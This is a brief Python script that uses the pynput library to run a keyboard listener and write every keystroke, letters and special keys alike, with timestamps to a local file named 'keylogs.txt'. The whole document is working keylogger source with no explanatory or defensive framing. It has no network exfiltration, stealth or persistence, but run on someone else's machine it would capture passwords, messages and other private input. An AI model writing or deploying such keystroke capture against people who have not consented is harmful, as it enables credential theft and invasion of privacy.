## pip install pynput
from pynput import keyboard
import logging

# Configure logging
log_file = "keylogs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")  # Logs alphanumeric keys
    except AttributeError:
        logging.info(f"Special Key: {key}")  # Logs special keys (Shift, Ctrl, etc.)

# Listener setup
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
